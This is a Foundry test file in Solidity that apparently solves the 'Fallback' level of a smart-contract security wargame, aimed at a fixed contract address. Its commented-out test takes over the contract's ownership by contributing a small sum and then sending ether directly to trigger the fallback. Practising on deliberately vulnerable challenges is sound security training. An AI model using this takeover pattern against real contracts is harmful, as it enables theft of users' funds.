// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Level1.sol";

contract Level1Test is Test {
    Fallback public f;
    address addr = 0x8606fbF4416A0bfD11965FA8083a838e3c5EcACD;

    function setUp() public {
        f = Fallback(payable(addr));
    }

    // function test_GetOwner() public {
    //     address alice = vm.addr(1);
    //     console.log(f.owner(), "old owner");
    //     vm.deal(alice, 20 ether);
    //     vm.startPrank(alice);
    //     f.contribute{value: 0.0001 ether}();
    //     (bool success,) = address(f).call{value: 0.0001 ether}("");
    //     console.log(success, "is ok?");
    //     vm.stopPrank();
    //     console.log(f.owner(), "new owner");
    //     assertEq(alice, f.owner());
    // }

    // function test_IsSuccess() public view {
    //     assertEq(f.owner(), 0xb1Eab112a506ab057ED7c5E9aB32758521497951);
    // }
}
